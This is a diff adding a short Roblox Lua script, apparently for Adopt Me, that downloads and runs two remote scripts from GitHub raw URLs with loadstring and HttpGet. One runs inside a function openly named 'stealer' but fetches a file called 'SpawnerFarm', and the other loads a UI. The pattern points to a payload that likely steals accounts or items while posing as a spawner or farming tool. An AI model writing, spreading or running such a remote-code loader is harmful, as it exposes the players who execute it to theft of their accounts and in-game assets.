@@ -1,0 +1,8 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptHuub/Adopt/refs/heads/main/SpawnerFarm'))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptHuub/AdoptR/refs/heads/main/Ro"))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
